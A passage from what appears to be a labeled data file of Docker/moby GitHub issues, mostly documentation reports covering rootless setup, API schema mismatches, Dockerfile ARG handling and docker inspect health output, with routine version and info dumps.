key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nsystemd is not recognized. There seems to be some relation to the login method [see stack exchange question & answer](https://unix.stackexchange.com/questions/587674/systemd-not-detected-dockerd-daemon-needs-to-be-started-manually)\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Open [Docker Rootless Tutorial on Katacoda](https://www.katacoda.com/courses/docker/rootless)\r\n2. Execute every command in the turorial\r\n\r\n\r\n**Describe the results you received:**\r\n\r\nreceive the warnings \r\n```\r\nsystemd is not detected, dockerd daemon needs to be started manually\r\n...\r\n#WARN: systemd not found. You have to remove XDG_RUNTIME_DIR manually on every logout\r\n``` \r\nand watch the first command in step 3 fail with\r\n![image](https://user-images.githubusercontent.com/29106652/91537131-17702800-e916-11ea-9454-aa7eaa9d7eec.png)\r\n\r\n**Describe the results you expected:**\r\nA tutorial [suggested by the maintainer of the project](https://youtu.be/Qq78zfXUq18?t=659) should work. Especially since it is identical to the tutorial on https://docs.docker.com/engine/security/rootless/ which also results in these warnings on my machine.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n![image](https://user-images.githubusercontent.com/29106652/91537740-14296c00-e917-11ea-8559-128c79e19036.png)\r\n\r\n\r\n**Output of `docker info`:**\r\n![image](https://user-images.githubusercontent.com/29106652/91537683-fd831500-e916-11ea-80f4-e77ba371dbae.png)\r\n\r\n\r\nI barely even understand what systemd does. So I really have no idea what is happening. If you have suggestions how to get this working it would be greatly appreciated.\r\n"},{"labels":[null,"documentation",null],"text":"**Description**\r\n\r\nThe documentation does not AFAIK mention that environment would take precedence over command line arguments, which is AFAIK not conventional.\r\n\r\nOnly mention is this [1]\r\n\r\n> You can also set the current context using the DOCKER_CONTEXT environment variable. This overrides the context set with docker context use.\r\n\r\n[1] https://docs.docker.com/engine/context/working-with-contexts/#use-a-different-context\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n```bash\r\n  ~ ls test\r\nDockerfile\r\n➜  ~ DOCKER_CONTEXT=/dev/null docker build ./test\r\nunable to resolve docker endpoint: context \"/dev/null\" does not exist\r\n```\r\n\r\n**Describe the results you received:**\r\n\r\nEnvironment is read instead of the positional `PATH`\r\n\r\n**Describe the results you expected:**\r\n\r\nCommand line is read.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nn/a\r\n\r\n**Output of `docker version`:**\r\n\r\nn/a - happens on all version I tried\r\n\r\n**Output of `docker info`:**\r\n\r\nn/a - happens on multiple systems\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nalso n/a"},{"labels":["documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nIn the OpenAPI documentation for the SystemDataUsage operation, the response schema describes a BuildCache as having properties CreatedAt and LastUsedAt of type integer. However, in the code types.BuildCache is defined as having properties CreatedAt and LastUsedAt of type time.time, and when a time.time value is passed to json.Encoder the type emitted in the JSON document is a RFC 3339 string because of time.time's MarshalJSON implementation.\r\n\r\nThis causes problems for anyone who is using the API documentation to autogenerate API clients.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run builds using BuildKit.\r\n2. Request SystemDataUsage via the API.\r\n\r\n**Describe the results you received:**\r\n\r\n    {\r\n      \"ID\": \"rrc3gr2ks5mm41ntmlqsqu2k4\",\r\n      \"Parent\": \"2tub3atjmssqqh0ji08jjc5oj\",\r\n      \"Type\": \"regular\",\r\n      \"Description\": \"fileop target\",\r\n      \"InUse\": false,\r\n      \"Shared\": false,\r\n      \"Size\": 353,\r\n      \"CreatedAt\": \"2020-06-17T14:55:03.5952988Z\",\r\n      \"LastUsedAt\": \"2020-06-17T14:55:44.6490503Z\",\r\n      \"UsageCount\": 1\r\n    }\r\n\r\nThis causes [Bollard](https://github.com/fussybeaver/bollard) to return a parse error because the CreatedAt property is found, but cannot be converted to an integer for storage into the struct.\r\n\r\n**Describe the results you expected:**\r\n\r\nEither CreatedAt and LastUsedAt should be integers, or the API specification should define these properties as strings (or being possibly being either type?).\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n$ docker version\r\nClient: Docker Engine - Community\r\n Version:           19.03.8\r\n API version:       1.40\r\n Go version:        go1.12.17\r\n Git commit:        afacb8b\r\n Built:             Wed Mar 11 01:21:11 2020\r\n OS/Arch:           darwin/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.8\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.12.17\r\n  Git commit:       afacb8b\r\n  Built:            Wed Mar 11 01:29:16 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          v1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\nI don't have the output of docker info because this issue was originally found by @mac-chaffee and raised as stepchowfun/docuum#78.\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nIn api document `/version` response looks like wrong.\r\nhttps://github.com/moby/moby/blob/master/docs/api/v1.40.yaml#L7715\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `curl --unix-socket /var/run/docker.sock localhost/version`\r\n\r\n**Describe the results you received:**\r\n```\r\n{\r\n  \"Platform\": {\r\n    \"Name\": \"Docker Engine - Community\"\r\n  },\r\n  \"Components\": [\r\n    {\r\n      \"Name\": \"Engine\",\r\n      \"Version\": \"19.03.12\",\r\n      \"Details\": {\r\n        \"ApiVersion\": \"1.40\",\r\n        \"Arch\": \"amd64\",\r\n        \"BuildTime\": \"2020-06-22T15:44:07.000000000+00:00\",\r\n        \"Experimental\": \"false\",\r\n        \"GitCommit\": \"48a66213fe\",\r\n        \"GoVersion\": \"go1.13.10\",\r\n        \"KernelVersion\": \"5.3.0-62-generic\",\r\n        \"MinAPIVersion\": \"1.12\",\r\n        \"Os\": \"linux\"\r\n      }\r\n    },\r\n    ...\r\n  ],\r\n  \"Version\": \"19.03.12\",\r\n  \"ApiVersion\": \"1.40\",\r\n  \"MinAPIVersion\": \"1.12\",\r\n  \"GitCommit\": \"48a66213fe\",\r\n  \"GoVersion\": \"go1.13.10\",\r\n  \"Os\": \"linux\",\r\n  \"Arch\": \"amd64\",\r\n  \"KernelVersion\": \"5.3.0-62-generic\",\r\n  \"BuildTime\": \"2020-06-22T15:44:07.000000000+00:00\"\r\n}\r\n```\r\n\r\n**Describe the results you expected:**\r\nLooks like document is wrong.\r\nWe should update document?\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.12\r\n API version:       1.40\r\n Go version:        go1.13.10\r\n Git commit:        48a66213fe\r\n Built:             Mon Jun 22 15:45:36 2020\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.12\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.13.10\r\n  Git commit:       48a66213fe\r\n  Built:            Mon Jun 22 15:44:07 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.12\r\n API version:       1.40\r\n Go version:        go1.13.10\r\n Git commit:        48a66213fe\r\n Built:             Mon Jun 22 15:45:36 2020\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.12\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.13.10\r\n  Git commit:       48a66213fe\r\n  Built:            Mon Jun 22 15:44:07 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n[I] docker.vim )\r\n[I] docker.vim ) docker info\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 2\r\n  Running: 1\r\n  Paused: 0\r\n  Stopped: 1\r\n Images: 52\r\n Server Version: 19.03.12\r\n Storage Driver: overlay2\r\n  Backing Filesystem: extfs\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  apparmor\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 5.3.0-62-generic\r\n Operating System: Ubuntu 18.04.4 LTS\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 8\r\n Total Memory: 31.09GiB\r\n Name: thinkpad\r\n ID: EKKH:UC2C:RDMA:JDP2:KDIG:GW2W:T2H3:S3LT:MWNI:D5YG:X24P:K2DC\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: false\r\n Username: skanehira\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nOS: Ubuntu 18.04.01"},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nI don't find anywhere any resource to raise ulimits with Docker Rootless. The documentation is [way too limited about it](https://docs.docker.com/engine/security/rootless/#limiting-resources) :\r\n\r\n> However, traditional ulimit and cpulimit can be still used, though they work in process-granularity rather than in container-granularity.\r\n\r\nI've edited my local limits (`/etc/security/limits.conf`) so my user has these ulimits : \r\n\r\n```\r\nopen files                  (-n) 40000\r\nmax user processes              (-u) 40000\r\n```\r\n\r\nMy daemon is automatically started by my `systemctl --user` service.\r\n\r\nWhen I run `docker run -it --rm ubuntu bash -c \"ulimit -n\"`, I get : `4096`\r\n\r\nWhat is very interesting is when I manually run the docker daemon (I stop the systemctl service, then run) : \r\n\r\n```console\r\n/home/myuser/bin/dockerd-rootless.sh --experimental --storage-driver=overlay2\r\n```\r\n\r\nAnd that I run `docker run -it --rm ubuntu bash -c \"ulimit -n\"`, I get : `40000`\r\n\r\n**So I don't know what is going on ! Why is my daemon loaded by systemctl ignoring my user ulimits ?**\r\n\r\nHere is my `~/.config/systemd/user/docker.service` file : \r\n\r\n```\r\n[Unit]\r\nDescription=Docker Application Container Engine (Rootless)\r\nDocumentation=https://docs.docker.com\r\n\r\n[Service]\r\nEnvironment=PATH=/home/myuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nExecStart=/home/myuser/bin/dockerd-rootless.sh --experimental --storage-driver=overlay2\r\nExecReload=/bin/kill -s HUP $MAINPID\r\nTimeoutSec=0\r\nRestartSec=2\r\nRestart=always\r\nStartLimitBurst=3\r\nStartLimitInterval=20s\r\nLimitNOFILE=infinity\r\nLimitNPROC=infinity\r\nLimitCORE=infinity\r\nTasksMax=infinity\r\nDelegate=yes\r\nType=simple\r\n\r\n[Install]\r\nWantedBy=default.target\r\n```\r\n\r\n<details><summary>Docker Info</summary>\r\n<p>\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 0\r\n  Running: 0\r\n  Paused: 0\r\n  Stopped: 0\r\n Images: 2\r\n Server Version: 19.03.8\r\n Storage Driver: vfs\r\n Logging Driver: json-file\r\n Cgroup Driver: none\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n  rootless\r\n Kernel Version: 4.15.0-99-generic\r\n Operating System: Ubuntu 18.04.2 LTS\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 3\r\n Total Memory: 3.849GiB\r\n Name: somelinux\r\n ID: CHQ7:K7CT:QQ7H:NKAD:PCYY:G4HK:HY7K:WLRU:CIGY:C6PD:CO6J:XKZ2\r\n Docker Root Dir: /home/dfob/.local/share/docker\r\n Debug Mode: false\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: true\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n\r\nWARNING: No swap limit support\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\n```\r\n\r\n</p>\r\n</details>\r\n\r\nThank you"},{"labels":[null,"documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\nWhen using ARG to specify an image or tag in a multi-stage Dockerfile, the ARG is not being applied correctly.\r\n\r\nThis is a simplified version of my Dockerfile which does not work:\r\n```\r\nFROM scratch\r\n\r\nARG node_version\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis example does work, but should not according to how I understand ARG to work:\r\n```\r\nARG node_version\r\n\r\nFROM scratch\r\n\r\nARG node_version=${node_version}\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis example also works:\r\n```\r\nARG node_version\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis leads to believe that there is a mishandling of the variables in multi-stage builds.\r\n\r\n**Steps to reproduce the issue:**\r\n1. run \"docker build . --build-arg=node_version=12.14.1\" with the Dockerfile above.\r\n\r\n**Describe the results you received:**\r\nDocker reports:\r\n```\r\nStep 3/3 : FROM node:${node_version}-alpine\r\ninvalid reference format\r\n```\r\n\r\n**Describe the results you expected:**\r\nI expect to be able to use a variable defined by ARG before the FROM in the FROM statement itself, even in multi-stage builds.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n```\r\nDocker version 19.03.8, build afacb8b\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 24\r\n  Running: 20\r\n  Paused: 0\r\n  Stopped: 4\r\n Images: 19\r\n Server Version: 19.03.8\r\n Storage Driver: overlay2\r\n  Backing Filesystem: <unknown>\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 4.19.76-linuxkit\r\n Operating System: Docker Desktop\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 2\r\n Total Memory: 1.943GiB\r\n Name: docker-desktop\r\n ID: AAU3:FDX7:NZ7A:MCNC:L5DC:NGLG:XMFS:NVNO:WPW3:OJKH:6YSQ:6JMR\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: true\r\n  File Descriptors: 142\r\n  Goroutines: 134\r\n  System Time: 2020-04-16T16:20:01.016176142Z\r\n  EventsListeners: 3\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nThis is reproducible under Google Cloud Builder when using the standard Docker build image here: gcr.io/cloud-builders/docker."},{"labels":["documentation",null],"text":"**Description**\r\nAccording to commit https://github.com/moby/moby/commit/32915b1d0a315598edb737785d0357b5a1b8aa11, we can no longer build `binary-client` by running `./hack/make.sh binary-client`.\r\nThe document could be updated."},{"labels":[null,"documentation",null,null],"text":"I noticed that we still have some old release branches in this repository. Some of those branches have changes that never made it into a release (or documentation cherry-picks that were published in the documentation, but not tagged as a release)\r\n\r\n\r\nBranch                                               | Changes not in a release\r\n-----------------------------------------------------|--------------------------------------------------------------\r\n[1.12.x](https://github.com/moby/moby/tree/1.12.x)   | https://github.com/moby/moby/compare/v1.12.6...1.12.x\r\n[1.13.x](https://github.com/moby/moby/tree/1.13.x)   | https://github.com/moby/moby/compare/v1.13.1...1.13.x\r\n[17.03.x](https://github.com/moby/moby/tree/17.03.x) | https://github.com/moby/moby/compare/v17.03.2-ce...17.03.x\r\n[17.04.x](https://github.com/moby/moby/tree/17.04.x) | https://github.com/moby/moby/compare/v17.04.0-ce...17.04.x\r\n[17.05.x](https://github.com/moby/moby/tree/17.05.x) | https://github.com/moby/moby/compare/v17.05.0-ce...17.05.x (no diff)\r\n[docs](https://github.com/moby/moby/tree/docs)       | documentation-only changes\r\n\r\n\r\nSome care should be taken when removing these branches, because the docker documentation fetches some resources from some of these branches; https://github.com/docker/docker.github.io/blob/ec57364ede82a135021e2e762bd0833d92a0cc0f/_scripts/fetch-upstream-resources.sh#L74 https://github.com/docker/docker.github.io/blob/ec57364ede82a135021e2e762bd0833d92a0cc0f/_scripts/fetch-upstream-resources.sh#L89-L95\r\n\r\n\r\nIn addition, with the introduction of the Swagger file (which is used to document current versions of the API), this repository only has a definition of the _current_ version of the API. Older versions of the API need to be fetched from either tags in various repositories, or from release-branches in those repositories. Having those files spread in various locations makes building the docs complicated, but also makes it more difficult to _compare_ changes between API versions, or to make fixes to the API documentation (if there's a bug or missing documentation in existing API versions).\r\n\r\nI'm planning to add copies of the swagger.yml for each API version. in this repository to address that.\r\n\r\n- [x] update docker-ce-packaging to build from upstream repositories instead of the mono-repo; https://github.com/docker/docker-ce-packaging/pull/449\r\n    - note: more changes needed in the private release packaging repositories, but those are tracked separately\r\n- [x] update fetch-upstream-resources.sh script in documentation repository to not depend on these branches (https://github.com/docker/docker.github.io/pull/10101)\r\n    - [x] https://github.com/docker/docker.github.io/pull/10343 Engine API: use template for API reference pages\r\n    - [x] https://github.com/docker/docker.github.io/pull/10348 Simplify use of \"ENGINE_BRANCH\" and \"DISTRIBUTION_BRANCH\"\r\n    - [x] https://github.com/docker/docker.github.io/pull/10344 [WIP] simplify fetching API versions\r\n    - [x] https://github.com/docker/docker.github.io/pull/10578 Engine API: remove per-branch fetching of API docs\r\n- [x] backport fetch-upstream-resources.sh changes to documentation archive branches\r\n    - [x] v18.09 archive branch https://github.com/docker/docker.github.io/pull/10196\r\n    - [x] v18.03 archive branch https://github.com/docker/docker.github.io/pull/10349\r\n    - [x] ~v17.12 archive branch~ won't fix\r\n    - [x] ~v17.09 archive branch~ won't fix\r\n    - [x] ~v17.06 archive branch~ won't fix\r\n    - [x] ~v17.03 archive branch~ won't fix\r\n    - [x] ~v1.13 archive branch~ won't fix\r\n- [x] add a copy of the swagger.yml for each released version of the API\r\n    - [x] v1.40 - docker v19.03 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.39 - docker v18.09 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.38 - docker v18.06 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.37 - docker v18.03 - v18.05 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.36 - docker v18.02 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.35 - docker v17.12 - v18.01 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.34 - docker v17.11 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.33 - docker v17.10 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.32 - docker v17.09 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.31 - docker v17.07 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.30 - docker v17.06 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.29 - docker v17.05 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.28 - docker v17.04 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.27 - docker v17.03 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.26 - docker v1.13.1 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.25 - docker v1.13.0 https://github.com/moby/moby/pull/40570 \r\n- [x] cherry-pick copy of swagger.yaml to current release branch\r\n    - [x] https://github.com/moby/moby/pull/40575 [19.03 backport] docs: add API versions v1.25 - v1.29, v1.38 - v1.40\r\n    - [x] https://github.com/moby/moby/pull/40779 [19.03 backport] docs: add API versions v1.30 - v1.37\r\n- [x] ~remove unused release-branches~ we can't update all archives, so we may want to keep the old branches (but eventually, \"archive\" the docker/docker-ce repository once it's no longer used in the build pipeline\r\n"},{"labels":[null,"documentation"],"text":"The `docker inspect` documentation doesn't describe the `Health` object being returned once healthchecks are configured.\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run -it --rm nginx`\r\n2. _docker inspect_ the container: `docker inspect --format '{{json .State.Health }}' ` and observe `null` according to the documentation (since the field doesn't exist). \r\n3. `docker run -it --rm --health-cmd=\"exit 0\" nginx`\r\n4. _docker inspect_ the container: `docker inspect --format '{{json .State.Health }}' ` and observe a valid JSON:\r\n\r\n `{\"Status\":\"healthy\",\"FailingStreak\":0,\"Log\":[{\"Start\":\"2019-12-22T10:59:05.6385933Z\",\"End\":\"2019-12-22T10:59:05.8078452Z\",\"ExitCode\":0,\"Output\":\"\"}]}`\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.5\r\n API version:       1.40\r\n Go version:        go1.12.12\r\n Git commit:        633a0ea\r\n Built:             Wed Nov 13 07:22:34 2019\r\n OS/Arch:           darwin/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.5\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.12.12\r\n  Git commit:       633a0ea\r\n  Built:            Wed Nov 13 07:29:19 2019\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          v1.2.10\r\n  GitCommit:        b34a5c8af56e510852c35414db4c1f4fa6172339\r\n runc:\r\n  Version:          1.0.0-rc8+dev\r\n  GitCommit:        3e425f80a8c931f88e6d94a8c831b9d5aa481657\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 2\r\n  Running: 2\r\n  Paused: 0\r\n  Stopped: 0\r\n Images: 51\r\n Server Version: 19.03.5\r\n Storage Driver: overlay2\r\n  Backing Filesystem: extfs\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: b34a5c8af56e510852c35414db4c1f4fa6172339\r\n runc version: 3e425f80a8c931f88e6d94a8c831b9d5aa481657\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 4.9.184-linuxkit\r\n Operating System: Docker Desktop\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 4\r\n Total Memory: 4.833GiB\r\n Name: docker-desktop\r\n ID: CBCJ:MNIU:ICXC:77PL:YXBA:K5EF:NE3L:5OHR:BIE4:TFOW:G4BB:2A2N\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: false\r\n HTTP Proxy: gateway.docker.internal:3128\r\n HTTPS Proxy: gateway.docker.internal:3129\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n```\r\n"},{"labels":[null,"documentation",null,null,null],"text":"The `.dockerignore` file has been around for a while, but there's still room for improvement. Opening this as a ticket, based on some notes I had, and some existing issues. I can break down this 